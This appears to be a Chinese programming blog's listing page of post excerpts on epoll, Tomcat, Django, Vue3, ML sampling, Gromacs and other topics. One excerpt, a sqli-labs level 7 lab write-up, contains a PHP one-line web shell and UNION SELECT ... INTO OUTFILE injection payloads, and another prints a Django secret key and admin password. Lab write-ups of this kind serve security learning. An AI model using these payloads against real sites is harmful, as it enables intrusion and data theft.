文章目录 1.epoll的事件模型1.1 ET(边沿模式)的设置1.2 基于管道epoll ET触发模式1.3 基于网络C/S模型的epoll ET触发模式1.4 基于网络C/S非阻塞模型的epoll ET触发模式1.4.1 设置非阻塞 1.5 基于多线程的边沿非阻塞处理 1.epoll的事件模型 EPOLL事件有两种模型：
Edge Triggered (ET) 边缘触发：只有数据到来才触发，不管缓存区中是否还有数据。ET是高速工作方式，只支持no-block socket。在这种模式下，当描述符从未就绪变为就绪时，内核通过epoll告诉你。然后它会假设你知道文件描述符已经就绪，并且不会再为那个文件描述符发送更多的就绪通知。请注意，如果一直不对这个fd作IO操作(从而导致它再次变成未就绪)，内核不会发送更多的通知(only once)。
Level Triggered (LT) 水平触发：只要缓存区有数据都会触发。LT是缺省的工作方式，并且同时支持block和no-block socket。在这种做法中，内核告诉你一个文件描述符是否就绪了，然后你可以对这个就绪的fd进行IO操作。如果你不作任何操作，内核还是会继续通知你的，所以，这种模式编程出错误可能性要小一点。传统的select/poll都是这种模型的代表。
1.1 ET(边沿模式)的设置 边沿模式不是默认的 epoll 模式，需要额外进行设置。epoll 设置边沿模式是非常简单的，epoll 管理的红黑树示例中每个节点都是 struct epoll_event 类型，只需要将 EPOLLET 添加到结构体的 events 成员中即可：
struct epoll_event ev; ev.events = EPOLLIN | EPOLLET;	// 设置边沿模式 1.2 基于管道epoll ET触发模式 /************************************************************************* #	&gt; File Name:server.c #	&gt; Author: Jay #	&gt; Mail: billysturate@gmail.com #	&gt; Created Time: Sun 23 Oct 2022 11:19:43 AM CST ************************************************************************/ #include &lt;stdio.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98c0d3301e6d9b13b413dfa1a8508733/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/99c7a973418c1b080272a20ea1d987e8/" rel="bookmark">
			【复现笔记】PoseCNN-PyTorch
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		PoseCNN-PyTorch: A PyTorch Implementation of the PoseCNN Framework for 6D Object Pose Estimation 代码github：https://github.com/NVlabs/PoseCNN-PyTorch
目录
PoseCNN-PyTorch: A PyTorch Implementation of the PoseCNN Framework for 6D Object Pose Estimation
1、下载代码
2、安装pytorch、Eigen、Sophus
3、pip install
4、Initialize the submodules
5、Compile the new layers under $ROOT/lib/layers introduced in PoseCNN
6、Compile cython components
7、Compile the ycb_render
8、下载数据集和预训练权重
9、运行demo
10、用YCB对象的合成数据训练自己的模型
11、Training and testing on the YCB-Video dataset
12、Training and testing on the DexYCB dataset
13、Running with ROS on a Realsense Camera for real-world pose estimation
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/99c7a973418c1b080272a20ea1d987e8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/030f8759f67ae8155eb72b46105683eb/" rel="bookmark">
			Python英语单词拼写训练考试系统，单词默写系统，统计易错词，基于Django
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		程序已经采集了近1000小学生常用单词，后台可以根据自己的需要进行添加题库进行测试。基于Django构建的小学生英文单词背写检测考试系统
安装教程
进入程序目录后安装依赖文件：
pip install -r requirements.txt
运行python3 manage.py runserver
后台管理地址http://127.0.0.1:8000/admin/
管理员登陆:
用户名：admin 密码：17python.com
前台地址http://127.0.0.1:8000/
完整程序下载地址：Python英语单词背写检测考试系统
前端截图
后台
核心代码
setting.py
# coding=utf-8 import os # Build paths inside the project like this: os.path.join(BASE_DIR, ...) BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__))) # Quick-start development settings - unsuitable for production # See https://docs.djangoproject.com/en/2.2/howto/deployment/checklist/ # SECURITY WARNING: keep the secret key used in production secret! SECRET_KEY = '=r0dm@=h9@^yo!f-kn^4sg@iiy$ub=t9%xciw0_y%_6!ntq#yw' # SECURITY WARNING: don't run with debug turned on in production!
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/030f8759f67ae8155eb72b46105683eb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24aef294fc6c83db60708c3c23580146/" rel="bookmark">
			linux环境下同时部署并启动多个tomcat服务
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		首先在linux环境下安装tomcat
将tomcat的压缩包上传到主机或者服务器上
tar -zxvf apache-tomcat-9.0.37.tar.gz
解压完成后会生成一个对应的目录
进入这个目录
pwd一下当前的路径，我的是这个路径
返回上一级目录，ls -a 可以看到隐藏的文件 .bash_profile是当前目录的环境变量配置文件
vi .bash_profile 把tomcat的路径加到环境变量中，
我的配置如下：
#tomcat_8080
export CATALINA_HOME=/root/service/tomcat_8080
export CATALINA_BASE=/root/service/tomcat_8080
export TOMCAT_HOME=/root/service/tomcat_8080
#tomcat_8081
export CATALINA_HOME2=/root/service/tomcat_8081
export CATALINA_BASE2=/root/service/tomcat_8081
export TOMCAT_HOME2=/root/service/tomcat_8081
然后保存，退出。
source .bash_profile 让环境变量生效。
然后修改第二个tomcat的catalina.sh
加入如下命令：
然后重启tomcat服务。
此时第一个tomcat已经启动了，重启第二个tomcat
然后,ps-ef|grep tomcat 即可看到两个tomcat服务
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c9fd770fa8a21624b4f45c60cb70f0ae/" rel="bookmark">
			tensorflow高版本适配低版本解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		tensorflow高版本适配低版本解决方法
IDE: PyCharm
tf版本: 2.4
问题
tensorflow2.4与原2.0不匹配，使用如下方法，IDE提示找不到compat模块。
失败的方法 import tensorflow.compat.v1 as tf tf.disable_v2_behaviour() 错误提示：找不到compat模块
解决:
import tensorflow as tf2 tf = tf2.compat.v1 tf.disable_v2_behavior() 跟原来的在理论上没有区别 ————————————————
转载:
原文链接：感谢原文方法
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/586ae072d4f86f99b1544cc5e1d98784/" rel="bookmark">
			java基础08--抽象类、接口、内部类
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		抽象类、接口、内部类 一、抽象类介绍使用场景语法 抽象类的注意事项和细节(注意： 1,5,8)抽象类和普通类的区别模板设计模式介绍案例 二、接口基本介绍接口使用的注意事项和使用细节(注意：4,6,8)实现接口VS继承类接口的多态特性多态传递 接口和抽象类的区别 三、内部类(重点、难点)基本介绍内部类的分类局部内部类匿名内部类（重要！！！）匿名内部类的使用匿名内部类使用的注意事项和细节匿名内部类的实践 成员内部类静态内部类 一、抽象类 介绍 使用场景 语法 抽象类的注意事项和细节(注意： 1,5,8) 抽象类和普通类的区别 不能被实例化，但可以作为父类引用指向子类对象修饰符不能有private，final，static如果有抽象方法抽象类一定要加上abstract继承过程中抽象方法一定要被实现或者继续抽象 模板设计模式 介绍 把通用的步骤放到抽象类的一个执行方法中，每个步骤定义成抽象方法，子类实现每个步骤的细节，当子类调用父类的执行方法时，如果遇到通用步骤就会调用子类的具体步骤来实现，（注意：新建对象时运行类型和编译类型都是子类的，只是调用了父类的方法而已，而通用步骤的方法子类对父类已经实现，所以调用的还是子类的）
案例 package com.bijing.static_.abstract_; public abstract class Template { public static void main(String[] args) { AA aa = new AA(); BB bb = new BB(); aa.getTime(); bb.getTime(); } public void getTime() { long startTime = System.currentTimeMillis(); job(); long endTime = System.currentTimeMillis(); System.out.println("运行时间:" + (endTime - startTime)); } public abstract void job(); } class AA extends Template { @Override public void job() { long sum = 0; for (long i = 0; i &lt; 100000; i++) { sum += i; } } } class BB extends Template { @Override public void job() { long sum = 0; for (long i = 0; i &lt; 1000000; i++) { sum += i; } } } 二、接口 基本介绍 注意：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/586ae072d4f86f99b1544cc5e1d98784/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d380e93771c8a064a02dba8c50fdf1c/" rel="bookmark">
			sqli-labs-----第7关
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		布尔盲注和一句话木马
布尔盲注：页面只返回 true/false
判断注入类型
判断数据库名长度
猜测数据库名
得到数据库名为security
猜测数据库security中表的数量
得到数据库中有4张表
猜测表名
..................
得到security数据库中4个表名分别为emails,referers,uagents,users
猜测users表中字段数
users表中字段数为3
猜测每个字段名长度
字段名长度分别为2，8，8
猜测字段名
第一个字段名：id
..................
得到第二个字段名：username
.................
得到第三个字段名：password 猜测username，password中数据
同样用burp suite抓包爆破
得到username，password的数据
完成
一句话木马
该关卡需要用到文件写入操作，所以需要开启MySQL中的文件写入
进入MySQL下的bin目录，用命令行连接数据库
查看是否开启文件写入
show variables like '%secure%';
需要修改secure_file_priv参数值
secure_file_priv='/'
NULL：限制mysql服务不允许导入/导出；
/tmp/：限制mysql的导入或导出只发生在/tmp/目录下；
没有具体值：不对mysql的导入/导出做限制
打开my.ini文件
查看修改是否成功
进行写入操作，写入一句话木马&lt;?php @eval($_post['password']);?&gt; 用文件写入爆出数据库信息
http://sqli.com/Less-7/?id=1')) union select user(),database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()) into outfile 'E:\\site\\phpStudy_64\\phpstudy_pro\\WWW\\sqli\\Less-7\\1.txt' --+ http://sqli.com/Less-7/?id=1')) union select version(),@@version_compile_os,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users') into outfile 'E:\\site\\phpStudy_64\\phpstudy_pro\\WWW\\sqli\\Less-7\\2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7d380e93771c8a064a02dba8c50fdf1c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/788a83666ee10bf8f448496e4fbc2bce/" rel="bookmark">
			FPN（特征金字塔结构）详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		FPN(Feature Pyramid Networks)
(a).特征图像金字塔结构，针对检测不同尺度的目标，将我们的图片首先缩放到不同的尺度
对于每一个尺度的图片，都依次通过我们的算法进行预测，但是要对每一个不同的尺度都要预测一次，需要预测很多次，效率比较低
(b).将图片通过backbone得到我们最终的一个特征图，然后再进行预测，就是faster-rcnn的一个流程.对于小目标预测效果不是很好
(c).首先将图片传入backbone，然后会在backbone正向传播的过程当中得到的不同特征图上分别进行一个预测
(d).FPN结构，将不同特征图上的特征去进行一个融合，然后在融合之后的特征图上再进行一个预测。（进行融合的不同特征图的尺寸也是有要求的，一般是2的整数倍，第一层28*28，第二层14*14，最上面7*7）
通过1*1的卷积核来保证他的channel是一样的，两倍上采样操作，将7*7转化为14*14，保证shape(高和宽)是一样的
然后进行一个add（拼接操作）
以ResNet50作为backbone
总结：FPN就是将不同的特征图上的特征进行融合。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fea33c357f22639e947c60272163d63c/" rel="bookmark">
			python解析xml遇到的问题分享(命名空间有关)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		背景
最近在工作中，要测试这样的一个需求：
要验证股票公司事件的数据入库规则，需要对开发的etl代码以及映射规则进行验证，然后数据源给的源文件格式是xml格式的，人工核对起来的话，考虑到有的字段还有枚举值映射关系或者一些简单的格式处理之类的，如果每次都人工去Ctrl + F去xml文件里面搜索标签去校验对应数据的话，效率不是特别的高，也不利于后续开发代码调整后的快速验证，因此我考虑自己用python脚本去按照分析师的规则文档自己解析一下xml文件，然后用自己解析出来的结果跟开发解析出来的数据进行一下对比，在一定程度上，能够稍微提升一下工作的效率。
过程&amp;遇到的问题
既然是要解析xml文件，我的第一反应是百度搜索“python xml解析” 然后我选中了菜鸟教程中的一个文档进行查看：
https://www.runoob.com/python/python-xml.html
在页面中可以看到，包括一般百度到的文章介绍都是说有三种方式可以解析：
接下来用一个案例去演示一下解析xml文件：
测试案例的xml文件demo如下：
&lt;?xml version="1.0"?&gt; &lt;corporate_actions xmlns="https://mp.weixin.qq.com/s/RGkBjpX5ipGHYNSOPaxktA" &gt; &lt;Students CLASSID="1" ID_REVISION="0000" ID_EVENT="12345678" xml:id="UCAEvent111212120000"&gt; &lt;student name="小博"&gt; &lt;classId&gt;1&lt;/classId&gt; &lt;year&gt;2011&lt;/year&gt; &lt;heigth&gt;173&lt;/heigth&gt; &lt;/student&gt; &lt;student name="张三"&gt; &lt;classId&gt;2&lt;/classId&gt; &lt;year&gt;2011&lt;/year&gt; &lt;heigth&gt;175&lt;/heigth&gt; &lt;/student&gt; &lt;/Students&gt; &lt;/corporate_actions&gt; 接下来我们先写代码去获取Students这个标签的数据：
然后很神奇的发现，直接用root.find去查找元素的时候，居然为空，看了网上的代码都是这么写的呀，一度陷入迷茫中。
问题如何解决
经过不断的搜索，最终看到别的小伙伴也遇到过这种问题：
经过查找，发现在xml中，如果文件头中带有xmlns属性的话，表示这个是带有命名空间的，在解析的时候，要加上命名空间。
关于xml的命名空间，可以参考下面的文章：
https://www.w3school.com.cn/xml/xml_namespaces.asp
最终可以匹配到元素的代码如下：
import xml.etree.ElementTree as ET xml_path = f"D:\\MyScripts\\PythonStudy\\QuotesApi\\ice.xml" tree = ET.parse(xml_path) # 打开xml文档 root = tree.getroot() student1 = root.find("Students") student2 = root.find("{https://mp.weixin.qq.com/s/RGkBjpX5ipGHYNSOPaxktA}Students") print(student1) # 没加命名空间，匹配不到元素 print(student2) # 加了命名空间，匹配不到元素 思考
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fea33c357f22639e947c60272163d63c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/19245b6f39078ae16e2af3344e23b5b9/" rel="bookmark">
			SLC、MLC、TLC与QLC的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 现在电脑基本大部分都是使用固态硬盘(ssd)了，大家也都知道固态硬盘相较于机械硬盘(ssd)它的体积更小，速度更快，当然这些也是它的优势。不过还有很多小伙伴担心固态硬盘的数据安全性与寿命，固态硬盘的各种级别各种参数也会给挑选它的人产生一些疑惑。那么今天，咱们首先来看看：固态硬盘是如何分级的？
固态硬盘主要由主控、缓存、与闪存颗粒三个主要部件组成，那他们都扮演了什么角色呢？
首先主控，它是固态硬盘的大脑，你可以简单的理解为它是固态硬盘的CPU，硬盘中的数据管理，与上集设备的数据连通等等，都是靠它。
然后就是固态硬盘的独立缓存，并不是所有固态硬盘都有独立缓存，但具备独立缓存的固态硬盘，它的4K读写性能就会更强，而如果你的固态硬盘作为系统盘，那4K小文件读写的场景往往更多，所以具备独立缓存芯片的固态硬盘往往定位高端。
接下来就是固态硬盘的闪存颗粒，它就是固态硬盘专门负责存储数据的部分，性能从高到低排序，分别为SLC、MLC、TLC与QLC，SLC不论在速度上还是颗粒寿命上都是这几个里面最优的，反之，QLC最差，但由于现在成本的原因，也由于现在的技术越来越成熟，目前主流的固态硬盘的颗粒，大多为TLC与QLC，MLC都已经非常罕见了。现在市面上定位中高端的固态硬盘往往都是TLC颗粒的，低端则大多为QLC颗粒。
这时肯定有人会有个疑问，这些颗粒具体的区别在哪呢？请看下图
SLC&lt;MLC&lt;TLC&lt;QLC 价格越来越低(性能)，读写速度也越来越低。
SLC 首先这些颗粒类型的主要区别就是层数不同，SLC全称为Single-Level Cell，也就是单层存储单元，一单位空间（cell）可以存储1bit数据，也就是1bit/cell，单颗粒理论擦写次数在10万次以上，这代表的就是如果你有一块SLC颗粒的固态硬盘，那理论上你可以写满这块硬盘10万次，它才会坏，但它的问题就是存储成本高。
MLC 而MLC全称为Multi-Level Cell，也就是双层存储单元，而它就达到了2bit/cell，相较于SLC，它的存储成更低，但在寿命上，也降低了很多，单颗粒理论擦写次数在3000-5000次左右。
TLC 然后就是TLC，也是目前主流定位高端的固态硬盘大多采用的颗粒类型，它的全称为Trinary-Level Cell，也就是三层存储单元，顾名思义，它可以达到3bit/cell，数据存储成本更低，容量是SLC的3倍、MLC的1.5倍。而它的寿命也更低，单颗粒理论擦写次数在500-3000次。
QLC 最后就是QLC，目前绝大部分定位低端的固态硬盘都采用的这个颗粒类型，它的全称为Quad-Level Cell，也就是四层存储单元，它为4bit/cell，所以存储成本也就是这些颗粒类型里最低的，而它的单颗粒理论擦写次数可想而知，仅为100-300次左右。
这时又有人要问了，QLC颗粒寿命这么短，是不是不能选啊？当然不是，但也分情况。
如果你有一块1TB的QLC颗粒的固态硬盘，标着150TBW。这代表着你这块固态硬盘可以重复写入150TB的数据，如果是正常的使用场景下，当做系统盘基本用个5年左右没什么问题，而且固态硬盘都有写入均衡技术，它会让固态硬盘所有的颗粒的擦写次数都是平均的。那为什么说分情况呢？因为并不是所有固态硬盘都是1TB以上这种大容量的，如果你用的是一块256GB的固态硬盘，它的寿命会大打折扣，因为容量的减少，重复擦写的次数也会大大增加。还有些QLC固态硬盘的寿命确实低到令人发指，比如某数的绿盘，1TB的版本也才80TBW。但对于大多这类低端的固态颗粒而言，更大的影响其实是在性能表现上。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7466628c05d2e1e344a5fdca0dfafc3d/" rel="bookmark">
			Html5播放器如何实现倍速播放
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		定义和用法 playbackRate 属性设置或返回音频的当前播放速度。
playbackspeed 指示音频的当前播放速度。
例值：
1.0 正常速度0.5 半速（更慢）2.0 倍速（更快）-1.0 向后，正常速度-0.5 向后，半速 示例代码1： 代码示例：
&lt;video id="video" controls src="**.mp4" type="video/mp4"&gt;&lt;/video&gt; 选择倍速播放： &lt;select id="select"&gt; &lt;option value="0.5"&gt;0.5&lt;/option&gt; &lt;option value="1" selected&gt;1.0&lt;/option&gt; &lt;option value="1.25"&gt;1.25&lt;/option&gt; &lt;option value="1.5"&gt;1.5&lt;/option&gt; &lt;option value="2"&gt;2.0&lt;/option&gt; &lt;/select&gt; var select = document.getElementById('select'); var video = document.getElementById('video'); select.addEventListener('change', function () { video.playbackRate = this.value; }) 示例2： 应用倍速实例。
&lt;div id="player"&gt;&lt;/div&gt; &lt;script src="//player.polyv.net/script/player.js"&gt;&lt;/script&gt; &lt;script&gt; var player = polyvPlayer({ wrap: '#player', width: 800, height: 533, vid: 'e785b2c81c9e018296671a1287e99615_e', }); &lt;/script&gt; speedboolean/array[2, 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7466628c05d2e1e344a5fdca0dfafc3d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afe996ca6c9ce5bc511ddadeb5940699/" rel="bookmark">
			电脑在开机时出现了bootmenu
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在开机的时候按DEL键，进入bios设置。在关于启动项目第一启动项修改成HDD，然后保存就可以了。如果下次启动还出现，那么就是你的CMOS不能保存信息，换电池一般就解决问题了。
1、在开机的时候无意中按到了快捷键，进入了快速启动模式，所以出现进入BOOT MENU的现象。
2、硬盘的数据线或者电源线接触不良，导致主板无法识别硬盘，不能加载硬盘，所以弹出这个提示框。可关闭电源，重新装机，开机，问题就解决了。
3、主板BIOS的第一启动，不是硬盘或者光盘，而是主板启动信息或者其它占为第一启动项，而导致无法引导硬盘直接进快捷启动项BOOT MENU的现象，所以只要将第一启动项改为硬盘即可。
4、BIOS 设置里的启动设备都无法正常启动， 如硬盘引导损坏， 硬盘物理损坏,，光驱读不了盘,，光驱内无启动光盘.。或者有可正常启动的设备,，却在 BIOS 设置里没有有效的设置。
可按如下方法设置：
1、开机点击bios快捷键进入到bios设置界面
2、进入Security—&gt;Secure Boot修改为Disabled
如果不修改Secure boot选项为Disabled，在光驱引导时可能会出现报错 3、进入Startup—UEFI/Legacy Boot选项，以下有两种选择
（1）UEFI/Legacy Boot选项选择成Both （2）UEFI/Legacy Boot选择成UEFI Only，CSM选择成YES
4、按F10保存设置
5、重新启动，完工。
[ 视频安全 ] 相关原创文章 教育教学类视频如何处理加密与安全（组图）防止360浏览器小窗下载视频视频安全之视频播放密码功能(设置观看密码功能教程)视频安全之授权播放和防录屏跑马灯企业级微信视频直播如何设定观看白名单（设定手机观看白名单、授权观看直播）在线教育网站如何更好的实现视频安全视频保护？免费视频二维码的完整使用教程（适合小企业做微信视频宣传） Html5视频video标签中使用blob实现视频播放加密 [ 视频直播 ] 相关原创文章 云直播客户端4.0活动拍摄类直播与教学培训类直播测试视频直播画中画效果（边角叠加、去背景、并列布局三种效果）做视频直播时如何测试本地网络的上行带宽(网速测试)在线导播台（网页导播台）混流效果云课堂直播功能介绍，更贴合在线教育、企业内训的场景应用微信公众号直播有哪些不一样的玩法？企业年会活动常用的音频类、视频类工具软件 我的信息卡片
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ba695ed6f5854f382d208b0da28a7ed/" rel="bookmark">
			我在 vue3 开发中踩的坑
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前期准备 由于 vite 在开发态是基于 ESM 进行模块化开发, 而 ESM 的浏览器兼容版本有限，如下图。
esm-兼容 所以，如果你打算使用 vite 作为构建工具去开发，你至少要有一个合适版本的浏览器。如果你和我一样，Chrome 版本的浏览器比较低，但是又不想升级，想留着偶尔方便自测和定位浏览器兼容问题，那我推荐你安装一个Chromium。这样你就可以一个电脑里面拥有两个 Chrome。_没有两个chrome的前端不是好前端[狗头]。_
chrome2 这时候，你可能又会有另外一个问题，_什么是 ESM？_ 关于这个问题，这里不展开说，有兴趣的可以看看这篇文章[1]。通俗易懂的理解，就是在开发态，我们加载的是模块化的 ts 或者 js，而且在打包后，我们加载的就是的 CommonJS,如下图。
esm noesm 除此之外，你要升级你的 node 环境到 node 14 以上版本。而如果你也是用的 windows 7, 这就有了第二个问题, 如何在 windows 7下安装 node 14？ 需要将下载的 node 包放在指定的 nvm 文件夹同时将系统变量 NODE_SKIP_PLATFORM_CHECK 设置为 1。
组件准备：因为希望组件风格和之前保持一致，为了更加灵活的修改组件，我们基于antdv[2]进行了简单封装，并发布到私有的 npm 仓库。
组件自动引入unplugin-vue-components
上面的封装也带来另外一个坑,就是会导致无法使用 unplugin-vue-components。我去提了issues 希望可以支持组件名动态设置[3] 和 PR[4], 应该下个版本 AntDesignVueResolver 就可以支持了。
你可能要习惯的和 vue2 的不同 在实际开发过程中，从 vue2 升级到 vue3 我觉得有几个地方或许是需要适用一下的，这里也提一下。
组合式 API 组合式 API 是一系列 API 的集合, 它是 Vue 3 和 Vue2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ba695ed6f5854f382d208b0da28a7ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3d4811340506d0908cd50d451dfc2b22/" rel="bookmark">
			机器学习样本不平衡处理方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		数据--样本不平衡处理
不同类别的样本量差异大，或少量样本代表了业务的关键数据，属于样本不平衡的情况，要求对少量样本的模式有很好的学习。
大数据情况下：整体数据规模大，小样本类别占比少，但是小样本也覆盖大部分或全部特征；
小数据情况下，整体数据规模小，小样本类别也少，导致样本特征分布不均匀。
一般比例差异超过10倍就要注意，超过20倍就得处理
工程方法中，通常从三个方面处理样本不均衡：
扩大数据集，但是在扩大小样本比例的时候，大样本也在增加，通过获取更多少量样本数据，尽可能扩大这些少量样本的数据集。
1、数据相关处理：欠采样和过采样，欠采样又称为下采样，过采样又称为上采样。实现简单，速度快
对大样本（超过1w或10w）进行欠采样，放弃一部分大样本数据；
对小样本（小于1w）进行过采样，相当于添加部分小样本的副本。
上采样 通过增加分类中少数样本的数量实现样本均衡，通常做法是在少数样本中加入随机噪声、干扰数据或通过一定规则产生新的合成样本。
ADASYN采样
样本较少的类生成合成数据，其生成的数据与更容易学习的样本相比，更难学习，.基本思想是根据学习难度不同，对不同少数类样本使用加权分布，其中，更难学习的少数类样本比那些更容易学习的少数类样本要产生更多的合成数据。ADASYN通过两种方式：减少由于类别不平衡带来的偏差。自适应地将分类决策边界转移到困难的例子。
SMOTE方法
基本思想是对于少数类别样本进行分析模拟，将人工模拟的新样本添加到数据集中。具体实现先找出一个正样本（少数），采用 KNN 算法找到该正样本的 K 个邻近，并随机从 K 个邻近中选出一个样本，最后再正样本和选中的随机样本之间连线上，随机选取一个点，作为人工合成的新正样本。合成后所有类别样本数量相当。
缺点：无法克服非平衡数据集的数据分布问题，容易产生分布边缘化问题。
SMOTE代码
from imblearn.over_sampling import SMOTE
print("Start over-sampling")
X_train, y_train = SMOTE().fit_resample(X_train, y_train)
下采样 减少分类中多数样本的数量实现样本均衡，通常做法是对样本进行聚类。
本项目采用 imblearn 的 ClusterCentroids 算法，本质上是一种原型生成 (Prototype generation) 的方法，对多数类样本采用 K-means 算法生成 N 个簇样本中心，并且通过样本中心合成新的样本，替代原始样本。新的多数类样本数将与少数类样本数达到平衡。
from imblearn.under_sampling import ClusterCentroids
print("Start under-sampling")
cc = ClusterCentroids()
X_train, y_train = cc.fit_resample(X_train, y_train)
过采样和欠采样结合 由于过采样容易导致过拟合，欠采样容易丢失有效信息，因此结合两种方法进一步削弱二者的缺点。这里采样 SMOTEENN 算法，先采用 SMOTE 算法进行过采样，再采用欠采样保留能够体现各类别特征的样本。其中 ENN (Edited Nearest Neighbours) 算法是基于 K 最近邻算法编辑数据集，找出与邻居不友好的样本然后移除，从而实现数据平衡。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/3d4811340506d0908cd50d451dfc2b22/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b0ba8f7dd22bd96cdacf2f4fea22e71e/" rel="bookmark">
			Gromacs伞形采样
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		伞形采样是一种加速采样方法。对于生物大分子而言，一些大的构象变化在现有的模拟尺度范围内很难达到或者根本无法达到。这种情况下人们往往采用给体系添加外部偏置力的手段加速这一过程的发生。具体的就是在大分子某一部位施加一个简谐力（可以想象成弹簧），以恒定速度牵引其移动。这一过程属于拉伸动力学（SMD）范畴。在拉伸过程中，上述被牵引的区域发生位移，然后挑选这期间的一些构象，以这些构象为初始帧进行独立的模拟（如图1）。最后用加权直方的手段对这些模拟进行整合，得出牵引过程能量变化情况。这一过程叫伞形采样。由此可见拉伸动力学模拟和伞形采样是密不可分的。本文将以溶菌酶配体复合物为例演示这一过程，拉伸结果见图2。
下文需要用到的各类文件wx后台回复“伞形采样” 自取。
图1 图2 1.常规模拟 这一步可以参照Gromacs官网（http://www.mdtutorials.com/gmx/complex/index.html）溶菌酶复合物教程。
可以跟着做到获得NPT模拟终状态为止。
当然你也可以直接使用提供的示例文件
2.拉伸模拟 这一步和常规成品模拟有两点区别：
1、制作索引基团的index文件：
比如我想要牵引的两个对象分别是配体和蛋白，那么需要将二者各自存放在一组内。本例中它们已被gromacs自动识别，所以无需新建。
cd pull #进入示例文件夹 gmx make_ndx -f NPT.gro -o index.ndx 记住蛋白所在组和配体所在组的组名，分别是Protein、JZ4。然后输入q，回车退出。
2、需要在成品模拟参数文件（mdp文件）基础上添加牵引“控件”：
如下所示：
pull = yes ; 开启牵引 pull_ncoords = 1 ; 设置有几个拉伸反应过程 pull_ngroups = 2 ; 在一个拉伸过程涉及两个拉伸组 pull_group1_name = JZ4 ; 第一个拉伸组的名称叫做JZ4，对应index文件的配体组名 pull_group2_name = Protein ; 第二个拉伸组的名称叫做Protein, 对应index文件的蛋白组名 pull_coord1_type = umbrella ; 使用简谐力牵引（类似于弹簧） pull_coord1_geometry = direction-periodic ; 牵引模式，有以下四种类型 ; distance:沿质心间的矢量, 用pull-dim选择分量 ; direction:沿pull-vec方向 ; direction-periodic:同direction, 距离可超过盒长一半. 使用时关闭压力耦合 ; cylinder:圆柱 pull_coord1_dim = N N Y ; 沿着Z轴方向牵引，和distance牵引模式搭配使用 pull-coord1-vec = 0 0 1 ; 沿着（0，0，1）矢量方向牵引，和direction、direction-periodic两种牵引模式搭配使用 pull_coord1_groups = 1 2 ; groups1 对应上面的JZ4， groups2对应Protein pull_coord1_start = yes ; 定义初始质心距离大于0 pull_coord1_rate = 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b0ba8f7dd22bd96cdacf2f4fea22e71e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a9e2c6ac94f996c023be7156ee665fd9/" rel="bookmark">
			python爱心代码合集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		python爱心代码合集 一行代码画爱心输出 I 爱 U填充型动态画红心 桃心线性 立体红心画一朵玫瑰花画树附录 一行代码画爱心 print('\n'.join([''.join([('Love'[(x-y)%len('Love')] if ((x*0.05)**2+(y*0.1)**2-1)**3-(x*0.05)**2*(y*0.1)**3&lt;=0 else' ') for x in range(-30,30)]) for y in range(15,-15,-1)])) 拆解一下，能看明白点。
